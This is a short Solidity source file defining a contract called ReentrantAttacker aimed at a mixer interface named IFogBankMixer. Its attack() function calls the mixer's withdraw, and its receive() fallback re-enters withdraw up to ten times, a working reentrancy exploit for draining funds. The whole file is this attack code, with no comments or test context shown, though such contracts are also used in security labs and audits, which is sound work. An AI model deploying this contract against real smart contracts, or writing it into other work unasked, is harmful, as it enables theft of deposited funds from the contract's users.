// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IFogBankMixer {
    function withdraw(bytes32 secret, address payable to) external;
}

contract ReentrantAttacker {
    IFogBankMixer public mixer;
    bytes32 public secret;
    uint256 public count;

    constructor(address _mixer, bytes32 _secret) {
        mixer = IFogBankMixer(_mixer);
        secret = _secret;
    }

    function attack() external {
        mixer.withdraw(secret, payable(address(this)));
    }

    receive() external payable {
        count++;
        if (count < 10) {
            mixer.withdraw(secret, payable(address(this)));
        }
    }
}
